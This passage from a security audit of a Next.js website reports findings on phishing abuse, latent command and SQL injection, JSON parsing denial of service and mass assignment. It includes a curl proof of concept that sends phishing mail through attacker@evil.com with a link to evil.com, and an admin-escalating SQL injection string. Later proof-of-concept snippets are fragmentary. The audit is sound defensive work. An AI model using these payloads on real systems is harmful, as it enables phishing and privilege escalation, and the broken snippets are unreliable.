  # the admin panel can use the site's IP reputation (formsubmit allows
  # 1 free email per IP per day without signup) to send arbitrary emails
  # to any email address containing "@". Phishing vector.
  curl -s -X POST https://victim.com/api/admin/email \
    -H "Content-Type: application/json" \
    -b /tmp/admin-cookie.jar \
    -d '{
      "action": "set_email",
      "email": "attacker@evil.com"
    }'
  # Then:
  curl -s -X POST https://victim.com/api/admin/email \
    -H "Content-Type: application/json" \
    -b /tmp/admin-cookie.jar \
    -d '{
      "action": "send",
      "subject": "URGENT: Reset your password",
      "body": "Click here: https://evil.com/reset"
    }'
  # formsubmit.co forwards this to attacker@evil.com — but if admin sets
  # forwardEmail to a VICTIM email (e.g., ceo@company.com) and then sends
  # a phishing email via /api/admin/email action=send, the email appears
  # to come from the legitimate site (because formsubmit.co is a known
  # service). Email-borne phishing pivot.
Severity: MEDIUM (admin-gated, phishing/abuse of formsubmit free tier
  from victim server IP).

6.  COMMAND INJECTION in scripts/ — PARTIAL (1 finding, LOW, latent)
==========================================================================

SEC-07-CMD-1  (LOW — latent SQL injection via shell interpolation)
------------------------------------------------------------------------
File  : scripts/reset-admin-password.sh:50
Code  :
  HASH=$(node -e "
  const bcrypt = require('./node_modules/bcryptjs');
  const hash = bcrypt.hashSync('$NEW_PASSWORD', 10);
  process.stdout.write(hash);
  " 2>/dev/null)
  # ...
  sqlite3 db/custom.db "UPDATE AccessUser SET passwordHash = '$HASH', active = 1 WHERE username = 'admin';"
Issue:
  (a) $NEW_PASSWORD is interpolated into the node -e script body
      (line 35). NEW_PASSWORD is hardcoded "admin123" so currently safe.
      If a future refactor adds `NEW_PASSWORD="$1"` (CLI arg), a single
      quote in the password would escape the JS string and allow JS
      injection → arbitrary code execution under node.
  (b) $HASH is interpolated into the SQL string (line 50) inside single
      quotes. Bcrypt hashes ($2a$10$...) do not contain single quotes,
      so currently safe. If hash format changes (e.g., a future scrypt
      migration produces hashes with `'` or `;`), SQL injection into
      the SQLite UPDATE statement becomes possible → e.g.:
        $HASH = "x', role='admin' --"
        UPDATE AccessUser SET passwordHash = 'x', role='admin' --', ... ;
      This would let the script escalate any user to admin.
Severity: LOW (latent — not exploitable today, but fragile).
Already noted as F-22 in the prior audit (worklog line 14261).

Other scripts (seed_access_users.py, seed_content.py, seed_texts.py,
seed_equipment.py, list_messages.py, generate-v16-tutorial.js,
generate_tutorial_v172.py, auto-backup.sh, keep-alive.sh):
  - Python scripts use `subprocess.run([...], ...)` with list args — no
    shell, no injection.
  - Bash scripts (auto-backup.sh, keep-alive.sh) take no user input.
  - JS scripts (generate-v16-tutorial.js) write a static docx file.
  No command-injection vectors.

VERDICT: 1 latent LOW (already known). No new command-injection finding.

SEC-07-JSON-1  (LOW)
------------------------------------------------------------------------
File  : src/app/api/admin/equipment/route.ts:24
Code  :

  return NextResponse.json({ ok: true, items: equipment.map(e => ({

  (default stack ~10k frames; admin can craft 10k+ nested arrays).

SEC-07-JSON-2  (LOW)
------------------------------------------------------------------------

Code  :

Same field (LabEquipment.specs). Adds a typeof guard (defensive) but
still calls JSON.parse on the string without try/catch. The whole GET

loading the homepage (which calls /api/content). DoS of the public

SEC-07-JSON-3  (LOW)

NOTE on JSON.parse in Next.js request bodies:
  All routes use `await req.json().catch(() => null)` (e.g., contact
  route:57, chat route:79, equipment POST:39, content POST:53, etc.).

8.  MASS ASSIGNMENT in admin routes — FAIL (5 findings, MEDIUM)
==========================================================================
Pattern: `const data = { ...body.data }; ... prisma.model.create/update({ data })`
with no field allowlist. Prisma rejects unknown columns (good), but
accepts ANY known column — including ones the admin should not be able
to set directly (e.g., `id` on create, `updatedAt`, or fields intended
for system-only mutation).

------------------------------------------------------------------------
SEC-07-MA-1  (MEDIUM — LabEquipment create/update)
------------------------------------------------------------------------
File  : src/app/api/admin/equipment/route.ts:51 (create)
File  : src/app/api/admin/equipment/route.ts:61-66 (update)
Code (create):

  if (data.specs && typeof data.specs === "object") {

Code (update):
  const data = { ...body.data };

PoC (combined with SEC-07-JSON-2):

        "visible": true,
        "order": 0

    }'

  # stack overflow → public site's equipment section breaks.
Severity: MEDIUM (admin-gated, but enables public-site DoS).

SEC-07-MA-4  (MEDIUM — NavItem update)

File  : src/app/api/admin/nav/route.ts:45-46

PoC:

    -b /tmp/admin-cookie.jar \
    -d '{

      "data": {

        "labelDe": "",
